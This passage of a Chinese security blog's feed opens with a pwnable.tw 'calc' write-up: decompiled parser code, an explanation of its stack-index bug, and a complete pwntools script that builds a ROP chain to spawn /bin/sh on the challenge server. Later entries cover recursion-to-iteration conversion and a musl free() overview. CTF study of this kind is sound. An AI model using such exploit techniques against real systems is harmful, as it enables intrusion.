[ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> *num_str_len; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *num; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> OptStack[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line"></span><br><span class="line">  num_start = expr;</span><br><span class="line">  OptTop = <span class="number">0</span>;</span><br><span class="line">  bzero(OptStack, <span class="number">0x64</span>u);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( expr[i] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )      <span class="comment">// 不是数字,读到符号了</span></span><br><span class="line">    &#123;</span><br><span class="line">      num_str_len = (<span class="type">char</span> *)(&amp;expr[i] - num_start);</span><br><span class="line">      num = (<span class="type">char</span> *)<span class="built_in">malloc</span>(num_str_len + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(num, num_start, num_str_len);</span><br><span class="line"></span><br><span class="line">      num[(_DWORD)num_str_len] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(num, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(num);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">      &#123;</span><br><span class="line">        top = (*NumStack)++;</span><br><span class="line">        NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( expr[i] &amp;&amp; expr[i + <span class="number">1</span>] - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )<span class="comment">// 遇到一个运算符,但是运算符后面不是数字</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      num_start = &amp;expr[i + <span class="number">1</span>];                 <span class="comment">// 取第二个数字</span></span><br><span class="line">      <span class="keyword">if</span> ( OptStack[OptTop] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( expr[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( OptStack[OptTop] != <span class="string">&#x27;+&#x27;</span> &amp;&amp; OptStack[OptTop] != <span class="string">&#x27;-&#x27;</span> )<span class="comment">// 从左到有依次计算</span></span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            OptStack[++OptTop] = expr[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(NumStack, OptStack[OptTop]);   <span class="comment">// 计算前面的结果</span></span><br><span class="line">            OptStack[OptTop] = expr[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(NumStack, OptStack[OptTop--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        OptStack[OptTop] = expr[i];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !expr[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( OptTop &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(NumStack, OptStack[OptTop--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要比一般的计算表达式的程序简单很多。</p><h1 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点:"></a>漏洞点:</h1><p>这个题目里面只有正数，没有负数。也就是说数字前面不能带正负号。当输入的第一个字符为运算符的时候，看这行代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = atoi(num);</span><br><span class="line"><span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">&#123;</span><br><span class="line">  top = (*NumStack)++;</span><br><span class="line">  NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时num &#x3D; ‘\x00’，atoi会返回一个0，那么它就不会压栈。这样只会计算的时候，就会导致top 少1，这样的话就会把数字栈的第一个元素，也就是top，也会参与到运算中。只要控制top 为合适的值，之后就可以实现任意地址写。</p><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式:"></a>利用方式:</h1><p>由于优先级的问题，导致数字栈内不可能push 太多的数字，但是可以计算多个表达式，所以只要在一个表达式内写一个值就行，利用下面这里的代码实现任意地址写:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v9 = atoi(num);</span><br><span class="line"><span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )                             <span class="comment">// 第一个如果输入是符号的话,会出问题,可以修改top</span></span><br><span class="line">&#123;</span><br><span class="line">  top = (*NumStack)++;</span><br><span class="line">  NumStack[top + <span class="number">1</span>] = v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(通过运算来写值的话太麻烦了，直接利用push 来写，为了防止数据被覆盖，在修改掉top后push 一个值即可)</p><p>流程:</p><ol><li>修改top到合适位置</li><li>push val写rop</li></ol><h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./calc&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">pop_eax = <span class="number">0x0805c34b</span> <span class="comment">#: pop eax ; ret</span></span><br><span class="line">pop_ecx_ebx = <span class="number">0x080701d1</span> <span class="comment"># pop ecx ; pop ebx ; ret</span></span><br><span class="line">pop_edx = <span class="number">0x080701aa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line"></span><br><span class="line">int_0x80 = <span class="number">0x08049a21</span></span><br><span class="line"></span><br><span class="line">read = <span class="number">0x806E6D0</span></span><br><span class="line">xsgetn = <span class="number">0x8053200</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x08049452</span></span><br><span class="line">bin_sh = <span class="number">0x80eb860</span></span><br><span class="line"></span><br><span class="line">payload = []</span><br><span class="line">offset = <span class="number">360</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">global</span> offset</span><br><span class="line">    pay = <span class="string">b&#x27;+&#x27;</span> + <span class="built_in">str</span>(offset).encode() + <span class="string">b&#x27;+&#x27;</span> + <span class="built_in">str</span>(val).encode()</span><br><span class="line">    payload.append(pay)</span><br><span class="line">    offset += <span class="number">1</span></span><br><span class="line"><span class="comment">#read bin sh...</span></span><br><span class="line">add(xsgetn)</span><br><span class="line">add(main)</span><br><span class="line">add(<span class="number">0x80EC360</span>)</span><br><span class="line">add(bin_sh)</span><br><span class="line">add(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) -<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload[i])</span><br><span class="line">    p.sendline(payload[i])</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#exp again.</span></span><br><span class="line">payload = []</span><br><span class="line">offset = <span class="number">360</span></span><br><span class="line">add(pop_eax)</span><br><span class="line">add(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">add(pop_ecx_ebx)</span><br><span class="line">add(bin_sh + <span class="number">0x10</span>)</span><br><span class="line">add(bin_sh)</span><br><span class="line">add(pop_edx)</span><br><span class="line">add(bin_sh + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(int_0x80)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;=== Welcome to SECPROG calculator ===&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload) -<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(payload[i])</span><br><span class="line">    p.sendline(payload[i])</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析:&quot;&gt;&lt;/a&gt;题目分析:&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/2022/10/20/pwnable-tw</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>任意递归写法转迭代写法2</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/13/%E4%BB%BB%E6%84%8F%E9%80%92%E5%BD%92%E5%86%99%E6%B3%95%E8%BD%AC%E8%BF%AD%E4%BB%A3%E5%86%99%E6%B3%952/</id>
    <published>2022-10-12T16:09:58.000Z</published>
    <updated>2022-10-12T16:16:29.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax</p><p>新的Ctx:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Ctx</span>&#123;</span></span><br><span class="line"><span class="type">int</span> args;     <span class="comment">//参数</span></span><br><span class="line"><span class="type">int</span> vars;     <span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> ret_addr; <span class="comment">//返回地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在递归调用的时候模拟call 指令，为新的函数运行开辟栈空间，保存返回地址，并更改pc变量的值，当函数返回时，将返回值放到ret_value 变量中</p><h1 id="Example1-二叉树中序遍历"><a href="#Example1-二叉树中序遍历" class="headerlink" title="Example1: 二叉树中序遍历"></a>Example1: 二叉树中序遍历</h1><h2 id="递归写法"><a href="#递归写法" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel_by_recursive</span><span class="params">(TreeNode*node)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">travel_by_recursive(node-&gt;left);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d\n&quot;</span>, node-&gt;val);</span><br><span class="line">travel_by_recursive(node-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法"><a href="#迭代写法" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line"><span class="type">int</span> val;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ctx</span>&#123;</span></span><br><span class="line">TreeNode*node;<span class="comment">//传递给当前函数的参数.</span></span><br><span class="line"><span class="type">int</span> vars;<span class="comment">//局部变量,当前函数内的</span></span><br><span class="line"><span class="type">int</span> ret_addr;<span class="comment">//控制下一行代码.</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">travel</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;ctx&gt; s;</span><br><span class="line"><span class="type">int</span> pc, ret_value;</span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; root, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line">ret_value = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="comment">//执行当前函数内(ctx)的代码:</span></span><br><span class="line"><span class="keyword">auto</span> &amp; t = s.top();</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> (t.node == <span class="literal">NULL</span>)&#123;</span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;left, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;left);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;val:%d&quot;</span>, t.node-&gt;val);<span class="comment">//printf(&quot;val:%d\n&quot;, node-&gt;val);</span></span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">s.push(&#123; t.node-&gt;right, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);<span class="comment">//travel_by_recursive(node-&gt;right);</span></span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">pc = t.ret_addr;<span class="comment">//函数返回.</span></span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Example2-分治法求无序数组中的最大值"><a href="#Example2-分治法求无序数组中的最大值" class="headerlink" title="Example2: 分治法求无序数组中的最大值"></a>Example2: 分治法求无序数组中的最大值</h1><h2 id="递归写法-1"><a href="#递归写法-1" class="headerlink" title="递归写法:"></a>递归写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_recursive</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (left == right || (right - left) == <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> max(arr[left], arr[right]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> left_m = get_max_by_recursive(arr, left, (left + right) / <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> right_m = get_max_by_recursive(arr, (left + right) / <span class="number">2</span> + <span class="number">1</span>, right);</span><br><span class="line"><span class="keyword">return</span> max(left_m, right_m);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="迭代写法-1"><a href="#迭代写法-1" class="headerlink" title="迭代写法:"></a>迭代写法:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BSMaxCtx</span>&#123;</span></span><br><span class="line"><span class="comment">//args:</span></span><br><span class="line"><span class="type">int</span>*arr;</span><br><span class="line"><span class="type">int</span> left, right;</span><br><span class="line"><span class="comment">//局部变量</span></span><br><span class="line"><span class="type">int</span> left_m, right_m;</span><br><span class="line"><span class="comment">//返回地址.</span></span><br><span class="line"><span class="type">int</span> ret_addr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">get_max_by_iterate</span><span class="params">(<span class="type">int</span>*arr, <span class="type">int</span> left, <span class="type">int</span> right)</span>&#123;</span><br><span class="line"><span class="built_in">stack</span>&lt;BSMaxCtx&gt;s;<span class="comment">//esp...</span></span><br><span class="line"><span class="type">int</span> pc,ret_value;<span class="comment">//eip,eax.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//第一次调用</span></span><br><span class="line">s.push(&#123; arr, left, right, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line">ret_value = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (!s.empty())&#123;</span><br><span class="line"><span class="keyword">auto</span>&amp; t = s.top();<span class="comment">//当前函数的运行上下文.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (pc)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//判断终止条件</span></span><br><span class="line"><span class="keyword">if</span> (t.left == t.right || (t.left + <span class="number">1</span>) == t.right)&#123;</span><br><span class="line"><span class="comment">//save returna value -&gt; ret_value</span></span><br><span class="line">ret_value = max(t.arr[t.left], t.arr[t.right]);</span><br><span class="line"><span class="comment">//ret.</span></span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">pc++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, left, (left + right) / 2);</span></span><br><span class="line">s.push(&#123; t.arr, t.left, (t.left + t.right) / <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="comment">//left_m = eax;</span></span><br><span class="line">t.left_m = ret_value;</span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="comment">//call get_max_by_recursive(arr, (left + right) / 2 + 1, right);</span></span><br><span class="line">s.push(&#123; t.arr, (t.left + t.right) / <span class="number">2</span> + <span class="number">1</span>, t.right, <span class="number">0</span>, <span class="number">0</span>, pc + <span class="number">1</span>&#125;);</span><br><span class="line">pc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="comment">//right_m = eax;</span></span><br><span class="line">t.right_m = ret_value;</span><br><span class="line">pc++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="comment">//return max(left_m, right_m);</span></span><br><span class="line">ret_value = max(t.left_m, t.right_m);</span><br><span class="line">pc = t.ret_addr;</span><br><span class="line">s.pop();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h1&gt;&lt;p&gt;感觉前面那个有点不优雅，改了一下，这次完全模拟C语言程序的栈结构，并且用两个变量pc和ret_value代表x86的eip 和 eax&lt;/p</summary>
      
    
    
    
    <category term="algorithm" scheme="https://h4ckf0rfun.github.io/categories/algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(3)free总览</title>
    <link href="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/"/>
    <id>https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/</id>
    <published>2022-10-12T10:51:40.000Z</published>
    <updated>2022-10-12T10:52:14.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="free-流程总览"><a href="#free-流程总览" class="headerlink" title="free 流程总览"></a>free 流程总览</h1><p><img src="https://h4ckf0rfun.github.io/2022/10/12/musl1-2-2%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6-3-free%E6%80%BB%E8%A7%88/free.svg" alt="free.svg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;free-流程总览&quot;&gt;&lt;a href=&quot;#free-流程总览&quot; class=&quot;headerlink&quot; title=&quot;free 流程总览&quot;&gt;&lt;/a&gt;free 流程总览&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://h4ckf0rfun.github.io/202</summary>
      
    
    
    
    <category term="Pwn" scheme="https://h4ckf0rfun.github.io/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>musl1.2.2堆管理机制-(2)malloc总览</title>
